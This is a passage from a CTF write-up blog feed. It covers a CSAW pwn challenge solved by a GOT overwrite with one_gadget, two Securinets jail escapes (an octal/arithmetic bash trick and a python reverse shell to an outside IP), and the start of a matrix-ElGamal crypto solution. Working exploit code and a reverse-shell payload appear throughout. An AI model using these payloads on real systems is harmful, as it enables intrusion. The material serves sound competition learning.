&lt;p&gt;Since the binary is compiled with &lt;code&gt;full RELRO&lt;/code&gt; and &lt;code&gt;PIE&lt;/code&gt; enabled we can&amp;rsquo;t overwrite anything in the binary (e.g. &lt;code&gt;.got&lt;/code&gt;, &lt;code&gt;.dtors&lt;/code&gt;, &amp;hellip;) (as far as I know), so we need to find something else to overwrite, I noticed that there a call to &lt;code&gt;puts&lt;/code&gt; function after calling to &lt;code&gt;read&lt;/code&gt; function, So we need find some hooks or function pointers that &lt;code&gt;puts&lt;/code&gt; function use.&lt;/p&gt;
&lt;p&gt;To do that I just set a break point at &lt;code&gt;main+228&lt;/code&gt; where &lt;code&gt;main&lt;/code&gt; call &lt;code&gt;puts&lt;/code&gt; then step into puts functions.&lt;/p&gt;
&lt;p&gt;I noticed that &lt;code&gt;puts&lt;/code&gt; will call &lt;code&gt;__tunable_get_val@plt&lt;/code&gt; at &lt;code&gt;puts+13&lt;/code&gt;, make sure that you are debugging the target libc, not the local one.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;gef&amp;gt; set environment LD_PRELOAD ./libc.so.6
gef&amp;gt; b *main+228 b *main+228
Breakpoint 1 at 0xa19
gef&amp;gt; r
Starting program: /opt/ctf/defile
Here&#39;s stdout:
0x7fcd74c16760
How much do you want to write?
0
Where do you want to write?
0
What do you want to write?
...
...
gef&amp;gt; disas puts
Dump of assembler code for function puts:
0x00007fcd748aa9c0 &amp;lt;+0&amp;gt;: push r13
0x00007fcd748aa9c2 &amp;lt;+2&amp;gt;: push r12
0x00007fcd748aa9c4 &amp;lt;+4&amp;gt;: mov r12,rdi
0x00007fcd748aa9c7 &amp;lt;+7&amp;gt;: push rbp
0x00007fcd748aa9c8 &amp;lt;+8&amp;gt;: push rbx
0x00007fcd748aa9c9 &amp;lt;+9&amp;gt;: sub rsp,0x8
0x00007fcd748aa9cd &amp;lt;+13&amp;gt;: call 0x7fcd7484b100 &amp;lt;__tunable_get_val@plt+16&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Since the libc is not compiled with &lt;code&gt;Full RELRO&lt;/code&gt;, we can overwrite &lt;code&gt;__tunable_get_val&lt;/code&gt; &lt;code&gt;.got&lt;/code&gt; entry&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;$ checksec --file libc.so.6
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In order to do that we need to calculate to offset between &lt;code&gt;stdout&lt;/code&gt; and &lt;code&gt;__tunable_get_val&lt;/code&gt; &lt;code&gt;.got&lt;/code&gt; entry, so step into &lt;code&gt;__tunable_get_val@plt+16&lt;/code&gt; and get the &lt;code&gt;.got&lt;/code&gt; entry address&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;...
...
gef&amp;gt; x/3i 0x7fcd7484b100
=&amp;gt; 0x7fcd7484b100 &amp;lt;__tunable_get_val@plt+16&amp;gt;: jmp QWORD PTR [rip+0x3c9fa2] # 0x7fcd74c150a8
0x7fcd7484b106 &amp;lt;__tunable_get_val@plt+22&amp;gt;: push 0x20
0x7fcd7484b10b &amp;lt;__tunable_get_val@plt+27&amp;gt;: jmp 0x7fcd7484afd0
...
...
gef&amp;gt; p 0x7fcd74c16760 - 0x7fcd74c150a8
$1 = 0x16b8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here the &lt;code&gt;stdout&lt;/code&gt; address is &lt;code&gt;0x7fcd74c16760&lt;/code&gt;, the &lt;code&gt;.got&lt;/code&gt; entry address is: &lt;code&gt;0x7fcd74c150a8&lt;/code&gt; and the offset is &lt;code&gt;0x16b8&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Now we can control &lt;code&gt;RIP&lt;/code&gt; register, but we have only one shot, we can&amp;rsquo;t do any ROP chaining, so we need to find &lt;code&gt;one_gadget&lt;/code&gt; RCE in that libc (see &lt;a href=&#34;https://github.com/david942j/one_gadget&#34; target=&#34;_blank&#34;&gt;one_gadget&lt;/a&gt;).&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;$ one_gadget libc.so.6
0x4f2c5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
constraints:
rcx == NULL
0x4f322 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
constraints:
[rsp+0x40] == NULL
0x10a38c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;exploit&#34;&gt;Exploit&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;get the &lt;code&gt;stdout&lt;/code&gt; address&lt;/li&gt;
&lt;li&gt;calculate the address of &lt;code&gt;__tunable_get_val&lt;/code&gt; got entry&lt;/li&gt;
&lt;li&gt;calculate the libc base address&lt;/li&gt;
&lt;li&gt;calculate the &lt;code&gt;one_gadget&lt;/code&gt; address&lt;/li&gt;
&lt;li&gt;overwrite the got entry with &lt;code&gt;one_gadget&lt;/code&gt; address.&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;exploit-code&#34;&gt;Exploit code&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import subprocess
from pwn import *
HOST = &amp;quot;pwn.chal.csaw.io&amp;quot;
PORT = 1004
def get_one_gadget(filename):
return list(map(
int,
subprocess.check_output([&#39;one_gadget&#39;, &#39;--raw&#39;, filename]).split(b&#39; &#39;)
))
def exploit():
offset = 0x16b8
libc = ELF(&amp;quot;./libc.so.6&amp;quot;)
stdout_libc = libc.sym[&amp;quot;_IO_2_1_stdout_&amp;quot;]
log.info(&amp;quot;stdout_libc: 0x%08x&amp;quot; % stdout_libc)
# one gadget RCE offsets
one_gadgets = get_one_gadget(&#39;./libc.so.6&#39;)
log.info(&amp;quot;one gadget RCE offsets: %s&amp;quot; % str(one_gadgets))
target = remote(HOST, PORT)
target.recvuntil(&amp;quot;Here&#39;s stdout:\n&amp;quot;)
buf = target.recvline().strip()
stdout = int(buf, 16)
log.info(&amp;quot;stdout: 0x%08x&amp;quot; % stdout)
libc_base = stdout - stdout_libc
log.info(&amp;quot;libc_base: 0x%08x&amp;quot; % libc_base)
got_entry = stdout - offset
one_gadget_libc = libc_base + one_gadgets[2]
log.info(&amp;quot;got_entry: 0x%08x&amp;quot; % got_entry)
log.info(&amp;quot;one_gadget: 0x%08x&amp;quot; % one_gadget_libc)
target.recvuntil(&amp;quot;do you want to write?\n&amp;quot;)
target.sendline(&#39;8&#39;)
target.recvuntil(&amp;quot;Where do you want to write?\n&amp;quot;)
target.send(str(got_entry))
target.recvuntil(&amp;quot;What do you want to write?\n&amp;quot;)
target.sendline(p64(one_gadget_libc))
target.sendline(&amp;quot;id;cat flag.txt;exit&amp;quot;)
buf = target.recvall()
if b&amp;quot;uid&amp;quot; in buf:
log.success(buf.decode())
else:
log.failure(buf.decode())
if __name__ == &amp;quot;__main__&amp;quot;:
exploit()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;running-the-exploit&#34;&gt;Running the exploit&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://philomath213.github.io/post/CSAW-CTF-Finals-2019-defile/screenshot1.png&#34; alt=&#34;screenshot1&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;flag&#34;&gt;Flag&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{me_you_in_room_1337_tonight}&lt;/p&gt;
&lt;/blockquote&gt;</description></item><item><title>Securinets CTF Quals 2019 Special Revenge</title><link>https://philomath213.github.io/post/securinets-ctf-quals-2019-special-revenge/</link><pubDate>Mon, 25 Mar 2019 11:59:39 +0100</pubDate><guid>https://philomath213.github.io/post/securinets-ctf-quals-2019-special-revenge/</guid><description>
&lt;h1 id=&#34;securinets-ctf-quals-2019-special-revenge-writeup&#34;&gt;Securinets CTF Quals 2019 - Special Revenge WriteUp&lt;/h1&gt;
&lt;h2 id=&#34;challenge-details&#34;&gt;Challenge details&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;Event&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Challenge&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Category&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Points&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Solves&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Securinets CTF Quals 2019&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Special Revenge&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;PWN&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;1000&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;5&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;After the disappointment of last year challenge &amp;ldquo;special&amp;rdquo;, I came this year with a mystery revenge.&lt;/p&gt;
&lt;p&gt;ssh special@51.254.114.246&lt;/p&gt;
&lt;p&gt;password : b8f07e1000c719c6a7febde4ec0ab24d&lt;/p&gt;
&lt;p&gt;Author : Anis_Boss&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Another jail escape challenge, we were provided with ssh login (username special).&lt;/p&gt;
&lt;p&gt;After being logged in to the server we will get this welcome message, and a prompt where we can type our command.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;================================
Welcome to Special Revenge
================================
|| ||&amp;lt;(.)&amp;gt;||&amp;lt;(.)&amp;gt;|| ||
|| _|| || ||_ ||
|| (__D || C__) ||
|| (__D || C__) ||
|| (__D || C__) ||
|| (__D || C__) ||
|| || || || ||
================================
Securinets - Quals
================================
&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As expected we can execute the usual command in this very restricted shell (&lt;code&gt;ls&lt;/code&gt;, &lt;code&gt;cat&lt;/code&gt;, &lt;code&gt;id&lt;/code&gt;), also we didn&amp;rsquo;t get any error message by typing these commands.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; ls
&amp;gt;&amp;gt; id
&amp;gt;&amp;gt; cat /etc/passwd
&amp;gt;&amp;gt; echo helloooooo
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I tried to escape this jail by sending interrupt signal (&lt;code&gt;CTRL+Z&lt;/code&gt;) since this a ssh session, and I got this message &lt;code&gt;&amp;quot;Hemm, nice one but you can&#39;t escape&amp;quot;&lt;/code&gt;, it seems that signal handler are altered by the jail script.&lt;/p&gt;
&lt;p&gt;Then I typed all alphanumeric characters to see if there any filters or a whitelist for words/characters, and got this very helpful error message.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
./mystery.sh: line 29: 1: command not found
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;which means that all the alphanumeric charset is filtered except &lt;code&gt;1&lt;/code&gt; (&lt;code&gt;1&lt;/code&gt;: command not found), and the jail script is executing the filter input at the end.&lt;/p&gt;
&lt;p&gt;I also did some tests to see if there are any allowed special characters, because with only &lt;code&gt;1&lt;/code&gt; there are no way to escape this jail, each time I put &lt;code&gt;1&lt;/code&gt; at the beginning and at the end and see what left between them.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; 1~`/;@#1
./mystery.sh: line 29: 1#1: command not found
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This means that &lt;code&gt;~`/;@&lt;/code&gt; are filtered while &lt;code&gt;#&lt;/code&gt; is allowed.&lt;/p&gt;
&lt;p&gt;After few attempts, I figure out that only these characters are allowed
&lt;code&gt;1&amp;lt;\&amp;quot;#$&#39;(){}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;So how can we escape this jail using just these 11 chars !!!!.&lt;/p&gt;
&lt;h3 id=&#34;objective&#34;&gt;Objective&lt;/h3&gt;
&lt;p&gt;Our objective is escaping this jail, How ??, by executing &lt;code&gt;/bin/sh&lt;/code&gt; or just &lt;code&gt;sh&lt;/code&gt; for short to spawn a shell, or by typing break to break the loop, &amp;hellip;&lt;/p&gt;
&lt;p&gt;the easiest one is spawning a shell by executing the &lt;code&gt;sh&lt;/code&gt; command, so we need to build the &lt;code&gt;sh&lt;/code&gt; string using the allowed characters.&lt;/p&gt;
&lt;h3 id=&#34;our-arsenal&#34;&gt;Our Arsenal&lt;/h3&gt;
&lt;p&gt;Despite the fact that all alphabetic are filtered, we have quit a few tricks at our disposal that we can use to build any command.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$# # number of arguments, evaluates as 0 in this case
$((expr)) # evaluate an arithmetic expression
$&#39;\116&#39; # convert octal to a character in string literal
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The 1st trick: &lt;code&gt;$#&lt;/code&gt; evaluates as &lt;code&gt;0&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; $#
./mystery.sh: line 29: 0: command not found
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So we have &lt;code&gt;1&lt;/code&gt; and &lt;code&gt;0&lt;/code&gt; in our hands, what come in my mind first was binary, since everything is built upon binary we can for sure build anything using these two lovely characters.&lt;/p&gt;
&lt;p&gt;The 2nd trick: &lt;code&gt;$((expr))&lt;/code&gt; will evaluate the arithmetic expression &lt;code&gt;expr&lt;/code&gt; and return the result.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#examples
$ echo $((1+1)) # addition
2
$ echo $((6-1)) # subtraction
5
$ echo $((2*3)) # multiplication
6
$ echo $((6/2)) # division
3
$ echo $((2&amp;lt;&amp;lt;4)) # shift left
32
$ echo $((32&amp;gt;&amp;gt;4)) # shift right
2
$ echo $((2#1010)) # convert binary value to decimal
10
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The last one is what we need, but we don&amp;rsquo;t have the character &lt;code&gt;2&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Fortunately we can get &lt;code&gt;2&lt;/code&gt; just by shifting left &lt;code&gt;1&lt;/code&gt; by one bit&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ echo $((1&amp;lt;&amp;lt;1))
2
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# $((1&amp;lt;&amp;lt;1)) =&amp;gt; 2
# $# =&amp;gt; 0
# $(($((1&amp;lt;&amp;lt;1))#1$#1$#)) =&amp;gt; $((2#1010)) =&amp;gt; 10
echo $(($((1&amp;lt;&amp;lt;1))#1$#1$#))
10
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The 3rd trick, &lt;code&gt;$&#39;\116&#39;&lt;/code&gt; convert the octal value &lt;code&gt;116&lt;/code&gt; to a character &lt;code&gt;N&lt;/code&gt; in string literal.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ echo $&#39;\163&#39;$&#39;\150&#39;
sh
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;remark&#34;&gt;Remark&lt;/h4&gt;
&lt;p&gt;I noticed that the input will be evaluate recursively twice, something like &lt;code&gt;eval(eval(INPUT))&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;When I run &lt;code&gt;\$\&#39;\\1$#1\&#39;&lt;/code&gt; in my bash I get this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ \$\&#39;\\1$#1\&#39;
bash: $&#39;\101&#39;: command not found
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;but when running the same input in the jail, I get this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; \$\&#39;\\1$#1\&#39;
/opt/mystery.sh: line 29: A: command not found
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;putting-the-pieces-together&#34;&gt;Putting the Pieces Together&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;\$\&#39;\\$(($((1&amp;lt;&amp;lt;1))#1$#1$#$#$#11))\&#39;\$\&#39;\\$(($((1&amp;lt;&amp;lt;1))#1$#$#1$#11$#))\&#39;
# 1st evaluation
=&amp;gt; \$\&#39;\\$((2#10100011))\&#39;\$\&#39;\\$((2#10010110))\&#39;
=&amp;gt; \$\&#39;\\163\&#39;\$\&#39;\\150\&#39;
=&amp;gt; $&#39;\163&#39;$&#39;\150&#39;
# 2nd evaluation
=&amp;gt; sh
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; \$\&#39;\\$(($((1&amp;lt;&amp;lt;1))#1$#1$#$#$#11))\&#39;\$\&#39;\\$(($((1&amp;lt;&amp;lt;1))#1$#$#1$#11$#))\&#39;
$ id
uid=1015(special) gid=1015(special) groups=1015(special)
$ ls -la
total 28
dr-xr-xr-x 2 special special 4096 Mar 22 02:02 .
drwxr-xr-x 22 root root 4096 Mar 24 10:18 ..
-rw-r--r-- 1 special special 220 Sep 1 2015 .bash_logout
-rw-r--r-- 1 special special 3771 Sep 1 2015 .bashrc
-rw-r----- 1 root special 47 Mar 22 02:02 flag.txt
-rw-r-x--- 1 root special 752 Mar 22 01:55 mystery
-rw-r--r-- 1 special special 655 May 16 2017 .profile
$ cat flag.txt
securinets{bash_never_stop_from_being_awesome}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Jail challenges are always painful at the beginning, so they require more patient than usual challenges. A good understanding of the shell environment and built-ins can be handful in scenarios like this one.&lt;/p&gt;
&lt;p&gt;FLAG: &lt;code&gt;securinets{bash_never_stop_from_being_awesome}&lt;/code&gt;&lt;/p&gt;</description></item><item><title>Securinets CTF Quals 2019 Stone Mining</title><link>https://philomath213.github.io/post/securinets-ctf-quals-2019-stone-mining/</link><pubDate>Sun, 24 Mar 2019 19:00:46 +0100</pubDate><guid>https://philomath213.github.io/post/securinets-ctf-quals-2019-stone-mining/</guid><description>
&lt;h1 id=&#34;securinets-ctf-quals-2019-stone-mining-writeup&#34;&gt;Securinets CTF Quals 2019 - Stone Mining WriteUp&lt;/h1&gt;
&lt;h2 id=&#34;challenge-details&#34;&gt;Challenge details&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;Event&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Challenge&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Category&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Points&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Solves&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Securinets CTF Quals 2019&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Stone Mining&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;PWN&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;1000&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;4&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;I went inside a mine thinking it was safe, but got stuck. Help me out.&lt;/p&gt;
&lt;p&gt;Service is running at: nc 52.17.200.40 4000&lt;/p&gt;
&lt;p&gt;Author: bibiwars&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A jail escape challenge this time, with no prompt, probably a shell jail.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Jail - Stone Mining
Objective is to read &#39;flag&#39; file from the current directory
___________________________________________________________
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;we can start by executing some random commands:&lt;/p&gt;
&lt;p&gt;shell: id, echo foobar, whoami &amp;hellip;&lt;/p&gt;
&lt;p&gt;python: print(&amp;ldquo;foobar&amp;rdquo;), dir() &amp;hellip;&lt;/p&gt;
&lt;p&gt;&amp;hellip;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;id
Not today, some blacklisted caracter has been used
echo foobar
Not today, some blacklisted caracter has been used
print(&amp;quot;foboar&amp;quot;)
Not today, some blacklisted caracter has been used
dir()
Not today, some blacklisted caracter has been used
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We got only one message &amp;ldquo;Not today, some blacklisted caracter has been used&amp;rdquo;, which means that there are some blacklisted chars.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;a
Not today, some blacklisted caracter has been used
b
Command executed :D
c
Not today, some blacklisted caracter has been used
d
Command executed :D
e
Command executed :D
f
Not today, some blacklisted caracter has been used
0
Not today, some blacklisted caracter has been used
1
Not today, some blacklisted caracter has been used
2
Not today, some blacklisted caracter has been used
3
Not today, some blacklisted caracter has been used
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As we can see, at least there some allowed chars.&lt;/p&gt;
&lt;p&gt;After some testing I found that these ascii lower case chars are allowed&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ertyuopdghbn
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;There are other allowed chars, but I used only these char to escape the jail.&lt;/p&gt;
&lt;p&gt;So how can we bypass that ?&lt;/p&gt;
&lt;p&gt;I first noticed that we can use &amp;ldquo;python&amp;rdquo; word since all its chars are allowed.&lt;/p&gt;
&lt;p&gt;I made an attempt to print to stdout, but didn&amp;rsquo;t get any output&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ nc 52.17.200.40 4000
Jail - Stone Mining
Objective is to read &#39;flag&#39; file from the current directory
___________________________________________________________
python
print(&#39;foobar&#39;)
exit()
^C
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So, I made an assumption that stdout, and stderr are closed, or filtered. Therefore, I attempt to connect to the outside using python sockets.&lt;/p&gt;
&lt;p&gt;I start a listener on my host and connect to it.&lt;/p&gt;
&lt;p&gt;Remote Host:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ nc 52.17.200.40 4000
Jail - Stone Mining
Objective is to read &#39;flag&#39; file from the current directory
___________________________________________________________
python
import socket
s = socket.socket()
s.connect((&#39;41.102.162.29&#39;, 2130))
s.send(b&#39;test\n&#39;)
^C
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;My host:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc -vvntlp 2130
Listening on any address 2130 (xds)
Connection from 41.102.162.29:39198
test
Total received bytes: 5
Total sent bytes: 0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So it works fine, after closing the connection (CTRL+C to close netcat).&lt;/p&gt;
&lt;h2 id=&#34;putting-the-pieces-together&#34;&gt;Putting the Pieces Together&lt;/h2&gt;
&lt;p&gt;The goal is getting reverse shell.&lt;/p&gt;
&lt;p&gt;First, Run the python interpreter.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Then copy/past the payload there, the script won&amp;rsquo;t execute til the connection is closed, since we are using netcat we need to send interrupt signal CTRL+C to close the connection.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import subprocess
cmd = [&amp;quot;python&amp;quot;,&amp;quot;-c&amp;quot;,&#39;import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&amp;quot;41.102.162.29&amp;quot;,2130)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;]
subprocess.Popen(cmd)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I used &amp;ldquo;subprocess.Popen&amp;rdquo; and run the &amp;ldquo;python -c&amp;rdquo;, to spawn a new background process, in order to avoid killing the process after closing the connection.
we won&amp;rsquo;t see any output in this jail, but you will get a reverser shell.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ nc -vvntlp 2130
Listening on any address 2130 (xds)
Connection from 41.102.162.29:39190
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ ls -la
total 12
drwxr-xr-x 1 root ctf 4096 Mar 24 02:10 .
drwxr-xr-x 1 root ctf 4096 Mar 24 02:10 ..
-rwxr-x--- 1 root ctf 59 Mar 23 04:17 flag
$ cat flag
c2VjdXJpbmV0c3szODExMjc5Zjg4M2JkM2Q3ZWFkZjU3NmNlY2Y4ZDVjYn0$
$ cat flag | base64 -d
securinets{3811279f883bd3d7eadf576cecf8d5cb}
$
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Jails could be escaped taking various ways.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;m not sure if the solution I come to is the intended one.&lt;/p&gt;
&lt;p&gt;FLAG: securinets{3811279f883bd3d7eadf576cecf8d5cb}&lt;/p&gt;</description></item><item><title>SharifCTF8_ElGamat</title><link>https://philomath213.github.io/post/sharifctf8_elgamat/</link><pubDate>Wed, 26 Sep 2018 22:19:28 +0100</pubDate><guid>https://philomath213.github.io/post/sharifctf8_elgamat/</guid><description>
&lt;h1 id=&#34;sharif-ctf-8-elgamat-writeup&#34;&gt;Sharif CTF 8 - ElGamat WriteUp&lt;/h1&gt;
&lt;h2 id=&#34;challenge-details&#34;&gt;Challenge details&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;Event&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;Challenge&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;Category&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Points&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Sharif CTF 8&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;ElGamat&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Crypto&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;200&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;ElGamal over Matrices: algebra-focused crypto challenge&lt;/p&gt;
&lt;p&gt;you can find full description in &lt;a href=&#34;https://philomath213.github.io/post/sharifctf8_elgamat/ElGamat.pdf&#34;&gt;ElGamat.pdf&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;attachments&#34;&gt;Attachments&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://philomath213.github.io/post/sharifctf8_elgamat/Matrices.txt&#34;&gt;Matrices.txt&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;
&lt;p&gt;This problem appears to be similar to the discrete logarithm problem (see &lt;a href=&#34;https://en.wikipedia.org/wiki/Discrete_logarithm&#34; target=&#34;_blank&#34;&gt;Discrete logarithm&lt;/a&gt;), but instead of the generator g we a have a matrix \(G\), So we need to find \(x\) such that \(G^x = H\) (both \(G\) and \(H\) are \(5\times5\) Matrices).&lt;/p&gt;
&lt;p&gt;Matrices =&amp;gt; Linear Algebra: this challenge requires some fundamentals in linear algebra.&lt;/p&gt;
&lt;p&gt;At the beginning I tried to diagonalize the matrix \(G\) and \(H\) in order to transform the problem to a discrete logarithm problem, but it will stay hard to solve since \(p-1\) is not a product of small primes which in this case Pohlig–Hellman algorithm is not an efficient method for computing the discrete logarithms.&lt;/p&gt;
&lt;p&gt;After doing some googling I figure out that in order to make this problem easy to solve we need to put both Matrices \(G\) and \(H\) in Jordan normal form (see &lt;a href=&#34;https://en.wikipedia.org/wiki/Jordan_normal_form&#34; target=&#34;_blank&#34;&gt;Jordan normal form&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;A Jordan matrix has each non-zero off-diagonal entry equal to \(1\), immediately above the main diagonal.&lt;/p&gt;
&lt;p&gt;for A a Jordan block as \(2\times2\) matrix, if we have a repeated eigenvalues:&lt;/p&gt;
&lt;p&gt;$$
A = \begin{pmatrix} \lambda &amp;amp; 1 \\ 0 &amp;amp; \lambda \end{pmatrix}
$$
for \(B = A^x\):
$$
B = \begin{pmatrix} \lambda^x &amp;amp; x\lambda^{x-1} \\ 0 &amp;amp; \lambda^x \end{pmatrix}
$$&lt;/p&gt;
&lt;p&gt;$$x = {-b \pm \sqrt{b^2-4ac} \over 2a}.$$&lt;/p&gt;
&lt;p&gt;therefore in this case:
$$
B&lt;em&gt;{12} = xB&lt;/em&gt;{11}A&lt;em&gt;{11}^{-1} \iff x = A&lt;/em&gt;{11}B&lt;em&gt;{12}B&lt;/em&gt;{11}^{-1}
$$&lt;/p&gt;
&lt;p&gt;Now we need to apply this solution to ElGamat problem&lt;/p&gt;
